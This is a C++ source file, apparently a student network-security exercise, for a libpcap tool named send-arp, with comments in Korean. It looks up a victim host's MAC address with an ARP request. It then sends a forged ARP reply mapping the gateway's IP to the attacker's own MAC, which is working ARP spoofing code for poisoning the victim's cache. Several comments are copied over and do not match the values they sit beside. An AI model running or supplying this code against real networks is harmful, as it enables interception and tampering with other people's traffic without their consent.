#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "request.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]");
    printf("sample: send-arp-test wlan0\n");
}

int main(int argc, char* argv[]) {
    if (argc < 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    int count = (argc - 2)/2;
    for (int i = 0; i < count; i++)
    {
        char my_mac[18];						// own mac
        //char target_mac[18];					// gateway mac
        char broadcast_mac[18];					// ff:ff:ff:ff:ff:ff:ff
        char sender_mac[18];					// victim mac

        char my_ip[16];
        char* sender_ip = argv[2+(2*i)];  		// victim
        char* target_ip = argv[3+(2*i)];		// gateway

        if(!get_my_mac(my_mac, dev))
            return -1;
        if(!get_my_ip(my_ip, dev))
            return -1;

        // 기본적인 mac을 설정
        sprintf(broadcast_mac,"%02x:%02x:%02x:%02x:%02x:%02x", 255, 255, 255, 255, 255, 255);
        // sprintf(targer_mac,"%02x:%02x:%02x:%02x:%02x:%02x", 0, 0, 0, 0, 0, 0);
        sprintf(sender_mac,"%02x:%02x:%02x:%02x:%02x:%02x", 0, 0, 0, 0, 0, 0);

        EthArpPacket ask_Packet;
        // 정상적인 동작으로 상대방의 mac을 얻어오기
        ask_Packet.eth_.dmac_ = Mac(broadcast_mac); 			// broadcasting
        ask_Packet.eth_.smac_ = Mac(my_mac); 					// mymac
        ask_Packet.eth_.type_ = htons(EthHdr::Arp);

        ask_Packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        ask_Packet.arp_.pro_ = htons(EthHdr::Ip4);
        ask_Packet.arp_.hln_ = Mac::SIZE;
        ask_Packet.arp_.pln_ = Ip::SIZE;
        ask_Packet.arp_.op_ = htons(ArpHdr::Request);
        ask_Packet.arp_.smac_ = Mac(my_mac);     				// my mac
        ask_Packet.arp_.sip_ = htonl(Ip(my_ip));				// my_ip
        ask_Packet.arp_.tmac_ = Mac(sender_mac);				// gateway_mac(unknown)
        ask_Packet.arp_.tip_ = htonl(Ip(sender_ip));			// gateway_ip

        // printf("ether: %s\n", ((std::string)ask_Packet.eth_.dmac()).c_str());
        // printf("ether:%s\n", ((std::string)ask_Packet.eth_.smac()).c_str());
        // printf("arp: %s\n", ((std::string)ask_Packet.arp_.tip()).c_str());
        // printf("arp: %s\n", ((std::string)ask_Packet.arp_.tmac()).c_str());
        // printf("arp: %s\n", ((std::string)ask_Packet.arp_.sip()).c_str());
        // printf("arp: %s\n", ((std::string)ask_Packet.arp_.smac()).c_str());

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&ask_Packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }

        while(true)
        {
            const u_char* packet;
            struct pcap_pkthdr* header;
            res = pcap_next_ex(handle, &header, &packet);

            if (res == 0) continue;
            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
                break;
            }

            u_char* p = (u_char*)packet;
            EthHdr re_Ether;
            if(memcpy(&re_Ether, p, sizeof(EthHdr)) == NULL)
            {
                printf("Can't Ether Header Packet Data copy");
                return -1;
            }

            // 패킷이 ARP가 아니거나 목적지가 내가 아니라면 다시 잡는다.
            if(re_Ether.type() != EthHdr::Arp)
                continue;
            if(re_Ether.dmac().operator!=(Mac(my_mac)))
                continue;

            p += sizeof(EthHdr);

            ArpHdr re_Arp;
            if(memcpy(&re_Arp, p, sizeof(ArpHdr)) == NULL)
            {
                printf("Can't Ether Header Packet Data copy");
                return -1;
            }

            // Arp의 목적지가 내가 아니라면 다시 잡는다.
            if(re_Arp.op() != ArpHdr::Reply)
                continue;

            if(re_Arp.tmac_.operator!=(Mac(my_mac)))
                continue;

            if(!re_Arp.tip().operator==(Ip(my_ip)))
                continue;

            sprintf(sender_mac,"%s",((std::string)re_Ether.smac()).c_str());
            /*
                현재 아는 사실 My Ip. My Mac, Target Ip, Sender Ip, Sender Mac
            */
            break;
        }
        EthArpPacket spoof_Packet;
        // 정상적인 동작으로 상대방의 mac을 얻어오기
        spoof_Packet.eth_.dmac_ = Mac(sender_mac); 			// broadcasting
        spoof_Packet.eth_.smac_ = Mac(my_mac); 					// mymac
        spoof_Packet.eth_.type_ = htons(EthHdr::Arp);

        spoof_Packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        spoof_Packet.arp_.pro_ = htons(EthHdr::Ip4);
        spoof_Packet.arp_.hln_ = Mac::SIZE;
        spoof_Packet.arp_.pln_ = Ip::SIZE;
        spoof_Packet.arp_.op_ = htons(ArpHdr::Reply);
        spoof_Packet.arp_.smac_ = Mac(my_mac);     				// my mac
        spoof_Packet.arp_.sip_ = htonl(Ip(target_ip));				// my_ip
        spoof_Packet.arp_.tmac_ = Mac(sender_mac);				// gateway_mac(unknown)
        spoof_Packet.arp_.tip_ = htonl(Ip(sender_ip));			// gateway_ip


        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&spoof_Packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
    }

    pcap_close(handle);
    return 0;
}
